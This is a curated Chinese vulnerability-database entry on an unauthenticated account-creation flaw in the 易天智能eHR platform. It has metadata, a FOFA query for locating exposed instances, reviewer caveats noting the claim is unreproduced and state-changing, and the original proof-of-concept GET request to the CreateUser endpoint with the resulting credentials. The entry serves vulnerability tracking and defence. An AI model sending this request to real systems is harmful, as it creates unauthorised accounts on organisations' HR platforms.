---
source: "wy876 漏洞文库"
title: "易天智能eHR UserAPI CreateUser无授权建号声称"
product: "易天智能eHR"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；OuterID绑定条件未给"
prerequisites: "GET无Cookie"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bub8xu5moq1cvagp"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B8%A9%E5%B7%9E%E5%B8%82%E6%98%93%E5%A4%A9%E4%BF%A1%E6%81%AF%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%98%93%E5%A4%A9%E6%99%BA%E8%83%BDeHR%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"易天智能eHR管理平台\""
id: "vw-9ab490ff47cda6d9b807282e"
entity_id: "ve-9ab490ff47cda6d9b807282e"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 易天智能eHR UserAPI CreateUser无授权建号声称

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：易天智能eHR；UserAPI CreateUser无授权建号声称
- 版本、配置及部署条件：版本未知；OuterID绑定条件未给
- 认证与权限前提：GET无Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 创建持久账号且凭据放URL有日志暴露/覆盖冲突风险，不适合默认只读检测
- 缺创建响应与后续登录角色证明，不能假设OuterID888/新账户为管理员
- 补版本/注册接口设计授权与修复，HTTP误标Java

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
温州市易天信息科技有限公司主要经营易天人力资源管理软件，是一家致力于人力资源管理软件产品研发的高科技公司。易天智能eHR管理平台任意用户添加漏洞。

## 二、影响版本
+ 易天智能eHR管理平台

## 三、资产测绘
+ fofa`body="易天智能eHR管理平台"`
+ 特征


## 四、漏洞复现
```http
GET /BaseManage/UserAPI/CreateUser?Account=stc&Password=123456&OuterID=888 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: close
Priority: u=1
```


```java
stc/123456	
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bub8xu5moq1cvagp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
